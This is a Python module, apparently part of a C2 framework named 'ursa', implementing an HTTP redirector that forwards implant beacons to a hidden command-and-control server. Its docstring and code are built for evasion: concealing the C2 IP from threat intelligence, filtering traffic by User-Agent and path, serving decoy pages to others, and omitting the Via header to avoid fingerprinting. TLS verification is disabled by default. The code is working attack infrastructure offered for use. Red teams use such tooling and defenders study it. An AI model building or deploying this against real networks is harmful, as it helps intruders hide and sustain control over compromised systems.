"""HTTP Redirector — transparent forwarding proxy for C2 operational security.

A redirector sits between implants on the target network and the actual C2
server, acting as a dumb HTTP forward proxy.  This provides operational
security by:

  - Hiding the real C2 IP from traffic inspection / threat intel feeds
  - Allowing the C2 server to be rotated without re-deploying implants
  - Filtering non-C2 traffic before it hits the C2 (e.g. by User-Agent or path)

Architecture
------------

    [Implant] ──POST /beacon──► [Redirector :80] ──► [C2 :6708]
                                        │
                      (non-matching requests → decoy response)

The redirector runs as a lightweight HTTP server.  Each incoming request is
forwarded to the upstream C2 with all original headers and body intact.

Usage
-----
    from major.redirector import Redirector, RedirectorConfig

    cfg = RedirectorConfig(
        listen_host="0.0.0.0",
        listen_port=80,
        upstream_url="https://10.0.0.1:6708",
        # Optional allow-list — only forward requests matching these paths
        allowed_paths=["/beacon", "/register", "/result", "/upload"],
        # Optional: require implants to include this User-Agent fragment
        user_agent_filter="Mozilla/5.0",
        # Decoy response for non-matching requests
        decoy_body=b"<html><body>Welcome</body></html>",
        decoy_content_type="text/html",
    )

    r = Redirector(cfg)
    r.start()        # Runs in a daemon thread
    r.stop()         # Graceful shutdown

Config via ursa.yaml
--------------------
    major:
      redirector:
        enabled: true
        listen_host: "0.0.0.0"
        listen_port: 80
        upstream_url: "https://10.0.0.1:6708"
        allowed_paths: []          # empty = forward everything
        user_agent_filter: ""      # empty = allow any UA
        verify_tls: false          # set true if upstream has a valid cert

Operational notes
-----------------
- The redirector sets ``X-Forwarded-For`` so the C2 sees the real implant IP.
- ``X-Forwarded-Proto`` is set to the original scheme (http/https).
- ``Via`` header is **not** added to avoid fingerprinting.
- For HTTPS upstream with a self-signed cert (the common case), set
  ``verify_tls=False`` in the config; the redirector disables cert validation
  for the upstream connection only.
"""

from __future__ import annotations

import threading
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse

# ── Config ─────────────────────────────────────────────────────────────────────


@dataclass
class RedirectorConfig:
    """Configuration for a single redirector instance."""

    listen_host: str = "0.0.0.0"
    listen_port: int = 80

    # Upstream C2 URL — all matched requests are forwarded here
    upstream_url: str = "http://127.0.0.1:6708"

    # If non-empty, only forward requests whose path starts with one of these.
    # All other requests receive the decoy response.
    # Example: ["/ajax/libs/", "/cdn/"]
    allowed_paths: list[str] = field(default_factory=list)

    # If non-empty, only forward requests whose User-Agent contains this string
    user_agent_filter: str = ""

    # Response body for non-matching / blocked requests
    decoy_body: bytes = b'{"status": "ok"}'
    decoy_content_type: str = "application/json"
    decoy_status: int = 200

    # Whether to verify TLS certs when connecting to an HTTPS upstream
    verify_tls: bool = False

    # Seconds before giving up on upstream
    upstream_timeout: int = 10


# ── Handler ────────────────────────────────────────────────────────────────────


class _RedirectorHandler(BaseHTTPRequestHandler):
    """Forward all matched requests to the upstream C2."""

    # Config is injected at class level by Redirector.start()
    _config: RedirectorConfig

    def log_message(self, format, *args):  # noqa: A002
        # Suppress default Apache-style access log; Redirector logs separately
        pass

    def _should_forward(self) -> bool:
        """Return True if this request should be forwarded to upstream."""
        path = urlparse(self.path).path

        # User-Agent filter
        ua_filter = self._config.user_agent_filter
        if ua_filter:
            ua = self.headers.get("User-Agent", "")
            if ua_filter not in ua:
                return False

        # Path allow-list
        allowed = self._config.allowed_paths
        if allowed:
            return any(path.startswith(p) for p in allowed)

        return True

    def _send_decoy(self):
        """Serve the configured decoy response."""
        cfg = self._config
        body = cfg.decoy_body
        self.send_response(cfg.decoy_status)
        self.send_header("Content-Type", cfg.decoy_content_type)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def _forward(self):
        """Forward the current request to the upstream C2."""
        cfg = self._config

        # Build upstream URL
        upstream = cfg.upstream_url.rstrip("/") + self.path
        method = self.command

        # Read request body
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length) if content_length > 0 else None

        # Build request headers (copy originals, add forwarding metadata)
        fwd_headers = {}
        for key, val in self.headers.items():
            # Drop hop-by-hop headers
            if key.lower() in (
                "connection", "keep-alive", "proxy-authenticate",
                "proxy-authorization", "te", "trailers", "transfer-encoding",
                "upgrade", "host",
            ):
                continue
            fwd_headers[key] = val

        # Inject forwarding headers
        client_ip = self.client_address[0]
        existing_xff = fwd_headers.get("X-Forwarded-For", "")
        if existing_xff:
            fwd_headers["X-Forwarded-For"] = f"{existing_xff}, {client_ip}"
        else:
            fwd_headers["X-Forwarded-For"] = client_ip

        scheme = "https" if cfg.upstream_url.startswith("https") else "http"
        fwd_headers["X-Forwarded-Proto"] = scheme

        # Disable TLS verification for self-signed upstream certs
        if not cfg.verify_tls and upstream.startswith("https://"):
            import ssl as _ssl
            ctx = _ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = _ssl.CERT_NONE
        else:
            ctx = None

        try:
            req = urllib.request.Request(
                url=upstream,
                data=body,
                headers=fwd_headers,
                method=method,
            )
            with urllib.request.urlopen(
                req,
                timeout=cfg.upstream_timeout,
                context=ctx,
            ) as resp:
                resp_body = resp.read()
                self.send_response(resp.status)
                for key, val in resp.headers.items():
                    if key.lower() in ("transfer-encoding", "connection"):
                        continue
                    self.send_header(key, val)
                self.send_header("Content-Length", str(len(resp_body)))
                self.end_headers()
                self.wfile.write(resp_body)

        except urllib.error.HTTPError as e:
            # Upstream returned an HTTP error — relay it faithfully
            resp_body = e.read() or b""
            self.send_response(e.code)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(resp_body)))
            self.end_headers()
            self.wfile.write(resp_body)

        except Exception:
            # Network / timeout error — serve decoy so the redirector
            # doesn't leak that something went wrong upstream
            self._send_decoy()

    def _dispatch(self):
        if self._should_forward():
            self._forward()
        else:
            self._send_decoy()

    # Handle all HTTP methods uniformly
    def do_GET(self):     self._dispatch()
    def do_POST(self):    self._dispatch()
    def do_PUT(self):     self._dispatch()
    def do_DELETE(self):  self._dispatch()
    def do_HEAD(self):    self._dispatch()
    def do_PATCH(self):   self._dispatch()
    def do_OPTIONS(self): self._dispatch()


# ── Redirector class ───────────────────────────────────────────────────────────


class Redirector:
    """Lightweight HTTP forwarding proxy for C2 operational security.

    Runs in a daemon thread so it doesn't block the main C2 process.
    """

    def __init__(self, config: RedirectorConfig):
        self.config = config
        self._server: HTTPServer | None = None
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        """Start the redirector in a background daemon thread."""
        if self._server is not None:
            raise RuntimeError("Redirector already running")

        # Inject config into handler class at runtime
        handler_cls = type(
            "_ConfiguredHandler",
            (_RedirectorHandler,),
            {"_config": self.config},
        )

        self._server = HTTPServer(
            (self.config.listen_host, self.config.listen_port),
            handler_cls,
        )

        self._thread = threading.Thread(
            target=self._server.serve_forever,
            daemon=True,
            name="ursa-redirector",
        )
        self._thread.start()

    def stop(self) -> None:
        """Gracefully shut down the redirector."""
        if self._server:
            self._server.shutdown()
            self._server = None
        self._thread = None

    @property
    def running(self) -> bool:
        return self._server is not None

    def __repr__(self) -> str:
        status = "running" if self.running else "stopped"
        return (
            f"Redirector({self.config.listen_host}:{self.config.listen_port}"
            f" → {self.config.upstream_url}, {status})"
        )


# ── Factory ────────────────────────────────────────────────────────────────────


def redirector_from_config(cfg) -> Redirector | None:
    """Build a Redirector from a UrsaConfig object.

    Returns None if redirectors are disabled in config.

    Example ursa.yaml::

        major:
          redirector:
            enabled: true
            listen_port: 80
            upstream_url: "https://10.0.0.1:6708"
    """
    if not cfg.get("major.redirector.enabled", False):
        return None

    rcfg = RedirectorConfig(
        listen_host=cfg.get("major.redirector.listen_host", "0.0.0.0"),
        listen_port=cfg.get("major.redirector.listen_port", 80),
        upstream_url=cfg.get("major.redirector.upstream_url", "http://127.0.0.1:6708"),
        allowed_paths=cfg.get("major.redirector.allowed_paths", []),
        user_agent_filter=cfg.get("major.redirector.user_agent_filter", ""),
        verify_tls=cfg.get("major.redirector.verify_tls", False),
        upstream_timeout=cfg.get("major.redirector.upstream_timeout", 10),
    )
    return Redirector(rcfg)
